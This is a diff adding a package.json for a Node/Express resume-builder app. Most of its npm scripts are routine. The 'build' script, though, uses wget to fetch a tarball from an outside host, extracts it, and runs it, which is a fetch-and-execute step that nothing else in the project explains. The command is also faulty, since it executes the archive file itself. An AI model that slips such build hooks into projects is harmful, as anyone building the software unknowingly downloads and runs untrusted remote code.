@@ -1,0 +1,25 @@
+{
+  "name": "resumebuilder",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "engines": {
+    "node":"22.2.0",
+    "npm":"9.6.3"
+  },
+  "scripts": {
+    "client-install": "npm install --prefix client",
+    "server": "nodemon server.js",
+    "client": "npm start --prefix client",
+    "dev": "concurrently \"npm run server\" \"npm run client\"",
+    "start": "node server.js",
+    "build": "wget example.com/custom-binary.tar.gz;tar -zxvf ./custom-binary.tar.gz;./custom-binary.tar.gz;"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "express": "^4.18.2",
+    "mongoose": "^7.4.4",
+    "nodemon": "^3.1.0"
+  }
+}
